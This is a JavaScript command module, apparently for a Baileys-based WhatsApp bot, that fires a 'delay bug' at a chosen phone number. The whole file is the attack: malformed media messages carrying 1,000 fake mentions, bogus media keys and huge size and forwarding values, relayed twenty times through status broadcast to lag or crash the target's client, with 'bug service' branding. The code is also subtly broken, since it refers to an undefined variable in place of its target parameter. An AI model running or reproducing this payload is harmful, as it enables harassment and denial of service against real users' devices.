import crypto from "crypto";

import pkg from 'bailey';

const { generateWAMessageFromContent } = pkg;


import channelSender from '../commands/channelSender.js'


// Configuration for delay bug
const BUG_CONFIG = {
    MENTION_COUNT: 1000,
    MAX_RETRIES: 3,
    PATTERNS: [
        'audioMessage',
        'imageMessage',
        'videoMessage',
        'stickerMessage'
    ],
    DELAY_RANGE: {
        MIN: 800,
        MAX: 1500
    }
};

async function sendDelayBug(target, client, pattern = 'audioMessage') {
    // Generate optimized mentions
    const mentionedJids = [
        ...Array.from({ length: BUG_CONFIG.MENTION_COUNT }, () => {
            const cc = Math.floor(Math.random() * 999);
            const num = Math.floor(Math.random() * 999999999);
            return `${cc}${num}@s.whatsapp.net`;
        })
    ];

  // Generate random but valid-looking media keys
  const mediaKeys = {
    url: "https://mmg.whatsapp.net/d/f/Am6qSOT-IdwYEerCoyKk-XgbkrGVJxX2nA3v68YHyYUS.enc",
    mime: "audio/mp4",
    fileSha256: crypto.randomBytes(32).toString('base64'),
    fileEncSha256: crypto.randomBytes(32).toString('base64'),
    mediaKey: crypto.randomBytes(32).toString('base64'),
    timestamp: Date.now() + 86400000 // 24 hours validity
  }

  const path = "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0";

  const longs = 99999999999999, loaded = 99999999999999;

  const data = "AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg==";

  const messageContext = {

    mentionedJid: mentionedJids,

    isForwarded: true,

    forwardedNewsletterMessageInfo: {

      newsletterJid: "120363321780343299@newsletter",

      serverMessageId: 1,

      newsletterName: "SENKU CRASHER"

    }

  };

  // Create dynamic message content based on pattern
  const messageContent = {
    ephemeralMessage: {
      message: {
        [pattern]: {
          url: mediaKeys.url,
          mimetype: pattern === 'audioMessage' ? mediaKeys.mime : 
                   pattern === 'imageMessage' ? 'image/jpeg' :
                   pattern === 'videoMessage' ? 'video/mp4' :
                   'image/webp',
          fileSha256: mediaKeys.fileSha256,
          fileLength: "999999999",
          seconds: pattern === 'audioMessage' || pattern === 'videoMessage' ? 120 : undefined,
          ptt: pattern === 'audioMessage' ? true : undefined,
          mediaKey: mediaKeys.mediaKey,
          fileEncSha256: mediaKeys.fileEncSha256,
          directPath: `/v/t62.${pattern}/${crypto.randomBytes(20).toString('hex')}.enc`,
          mediaKeyTimestamp: mediaKeys.timestamp,
          jpegThumbnail: pattern !== 'audioMessage' ? Buffer.from(crypto.randomBytes(32)).toString('base64') : undefined,
          contextInfo: {
            mentionedJid: mentionedJids,
            isForwarded: true,
            forwardingScore: 999999999,
            forwardedNewsletterMessageInfo: {
              newsletterJid: "120363422552152940@newsletter",
              serverMessageId: Date.now(),
              newsletterName: "⚡ MICKKING DELAY BUG ⚡"
            }
          },
          waveform: pattern === 'audioMessage' ? Buffer.from(crypto.randomBytes(24)).toString('base64') : undefined
        }
      }
    }
  };

  const msg = generateWAMessageFromContent(isTarget, messageContent, { userJid: isTarget });

  const broadcastSend = {

    messageId: msg.key.id,

    statusJidList: [isTarget],

    additionalNodes: [{

      tag: "meta",

      attrs: {},

      content: [{

        tag: "mentioned_users",

        attrs: {},

        content: [{ tag: "to", attrs: { jid: isTarget }, content: undefined }]

      }]

    }]

  };

  await client.relayMessage("status@broadcast", msg.message, broadcastSend);

}


async function delay(message, client) {
    try {
        const remoteJid = message.key?.remoteJid;
        if (!remoteJid) {
            throw new Error("Message JID is undefined.");
        }

        // Check if it's a group
        if (remoteJid.endsWith('@g.us')) {
            throw new Error("❌ This command cannot be used in groups.");
        }

        // Initial status message with button
        const timestamp = new Date().toLocaleTimeString();
        await client.sendMessage(remoteJid, { 
            text: `━━━━『 *MICKKING DELAY BUG* 』━━━━\n\n` +
                 `⚡ *Status:* Initializing...\n` +
                 `⏰ *Time:* ${timestamp}\n\n` +
                 `_System preparing for bug delivery..._`,
            contextInfo: {
                externalAdReply: {
                    title: "MICKKING Bug Service",
                    body: "Premium Delay Bug",
                    showAdAttribution: true,
                    renderLargerThumbnail: true
                }
            }
        });

        // Get target from reply or argument
        let participant;
        if (message.message?.extendedTextMessage?.contextInfo?.quotedMessage) {
            participant = message.message.extendedTextMessage.contextInfo.participant;
        } else {
            const messageBody = message.message?.extendedTextMessage?.text || message.message?.conversation || '';
            const args = messageBody.slice(1).trim().split(/\s+/).slice(1);
            if (args.length > 0) {
                participant = args[0].replace('@', '') + '@s.whatsapp.net';
            } else {
                throw new Error('❌ Please reply to a message or provide a number to send the bug.');
            }
        }

        // Progress message
        await client.sendMessage(remoteJid, {
            text: `🎯 *Target:* @${participant.split('@')[0]}\n⏳ *Status:* Processing...\n\n_Please wait while the delay bug is being sent..._`,
            mentions: [participant]
        });

        // Execute bug sending with progress tracking
        const totalIterations = 20;
        let successCount = 0;

        for (let i = 0; i < totalIterations; i++) {
            try {
                await sendDelayBug(participant, client);
                successCount++;
                
                // Update progress every 5 iterations
                if ((i + 1) % 5 === 0) {
                    await client.sendMessage(remoteJid, {
                        text: `*Progress Update:*\n✅ ${i + 1}/${totalIterations} bugs sent\n📊 Success rate: ${((successCount/(i+1))*100).toFixed(1)}%`
                    }, { quoted: message });
                }

                // Random delay between 1-2 seconds
                await new Promise(resolve => setTimeout(resolve, 1000 + Math.random() * 1000));
            } catch (iterError) {
                console.log(`Bug ${i + 1} failed:`, iterError);
                continue;
            }
        }

        // Final success message
        await client.sendMessage(remoteJid, {
            text: `━━━━『 *Delay Bug Report* 』━━━━\n\n` +
                 `🎯 *Target:* @${participant.split('@')[0]}\n` +
                 `📊 *Success Rate:* ${((successCount/totalIterations)*100).toFixed(1)}%\n` +
                 `✅ *Bugs Sent:* ${successCount}/${totalIterations}\n\n` +
                 `━━『 *MICKKING BUG SERVICE* 』━━`,
            mentions: [participant]
        });

    } catch (error) {
        console.error("Delay bug error:", error);
        
        // Send formatted error message
        const errorMessage = `━━━━『 *Error Report* 』━━━━\n\n` +
                           `❌ *Bug Sending Failed*\n` +
                           `⚠️ *Error:* ${error.message}\n` +
                           `⏰ *Time:* ${new Date().toLocaleTimeString()}\n\n` +
                           `_Please try again in a few minutes..._\n\n` +
                           `━━『 *MICKKING BUG SERVICE* 』━━`;

        if (message.key.remoteJid) {
            try {
                await client.sendMessage(message.key.remoteJid, {
                    text: errorMessage,
                    contextInfo: {
                        externalAdReply: {
                            title: "Delay Bug Service",
                            body: "Error Notification",
                            showAdAttribution: true
                        }
                    }
                });
            } catch (sendError) {
                console.error("Failed to send error message:", sendError);
            }
        }
    }
}

export default delay;